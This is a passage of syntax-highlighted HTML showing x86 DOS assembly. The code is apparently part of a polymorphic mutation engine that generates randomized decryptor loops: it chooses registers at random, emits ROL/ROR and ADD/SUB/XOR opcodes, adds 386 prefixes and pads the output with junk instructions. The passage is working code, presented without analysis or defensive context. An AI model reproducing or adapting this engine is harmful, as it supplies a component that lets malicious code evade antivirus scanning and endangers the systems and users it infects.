        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0b9h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nororing</span><span class="sc0">                        </span><span class="sc1">; if using CX no rol/ror!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; we'll ror/rol</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dim_select</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; rol/ror with diff CL</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dim_select</span><span class="sc0">

</span><span class="sc5">nororing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">dim_select</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">dim_select</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; 0 - 2   byte operation</span><span class="sc0">
                                                </span><span class="sc1">; 3 - 5   word operation</span><span class="sc0">
                                                </span><span class="sc1">; 6 - 7  dword operation</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">notaword</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; word operation</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">notaword</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; dword operation</span><span class="sc0">

</span><span class="sc5">notaword</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; no 8bit stuff with reg</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_chck</span><span class="sc0">                         </span><span class="sc1">; modifications</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_chck</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">no_chck</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">; we will fill this later</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; shit stuff</span><span class="sc0">

</span><span class="sc5">isntapnt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; select a pointer</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">isntapnt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isntapnt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; can't be same as counter</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isntapnt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov _reg16_,immediate</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; save pointer position</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dontcl</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">make_a_cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                         </span><span class="sc1">; mov cl,rot_num</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">redorandom</span><span class="sc0">
</span><span class="sc5">make_a_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc0">                         </span><span class="sc1">; mov cx,rot_num</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">redorandom</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                          </span><span class="sc1">; how many rols/rors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">redorandom</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cl_move</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_cxbadd</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; something for ch</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_cxbadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; garbage</span><span class="sc0">
</span><span class="sc5">dontcl</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">withsegmentop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                          </span><span class="sc1">; PUSH CS</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                          </span><span class="sc1">; POP DS</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; don't use ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">withsegmentop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">d_immedia</span><span class="sc0">
</span><span class="sc5">rndget2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; no sp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rndget2</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rndget2</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rndget2</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; no ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">rndget2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_prefix3</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_386_prefix</span><span class="sc0">

</span><span class="sc5">no_prefix3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_ax</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">d_immediap1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_ax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">d_immediap1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">

</span><span class="sc5">d_immedia</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; where we will jump</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">mathoperation</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc0">                         </span><span class="sc1">; CS:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">mathoperation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">puremath</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc0">                         </span><span class="sc1">; ROL/ROR base byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rolbyte</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; word = byte +1</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rolbyte</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_386_prefix</span><span class="sc0">

</span><span class="sc5">rolbyte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; first rol/ror byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">rollinging</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; roring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; encryptor always with SI</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rolend</span><span class="sc0">
</span><span class="sc5">rollinging</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0ch</span><span class="sc0">       </span><span class="sc1">; ROL/ROR base</span><span class="sc0">
</span><span class="sc5">rolend</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; used register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                          </span><span class="sc1">; use SI</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer_ro</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">; use DI</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer_ro</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; use BX</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer_ro</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">                         </span><span class="sc1">; so it is bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; bp needs 1 byte more</span><span class="sc0">
</span><span class="sc5">finish_pointer_ro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nowordi</span><span class="sc0">
</span><span class="sc5">puremath</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">immediate_use</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">op_selecting</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_386_prefix</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">02eh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_probs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0662eh</span><span class="sc0">

</span><span class="sc5">no_probs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">op_selecting</span><span class="sc0">

</span><span class="sc5">immediate_use</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">                         </span><span class="sc1">; ADD/SUB/XOR base</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">goforbyte</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; word = byte + 1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">goforbyte</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_386_prefix</span><span class="sc0">

</span><span class="sc5">goforbyte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">op_selecting</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">                       </span><span class="sc1">; select which</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_addo</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
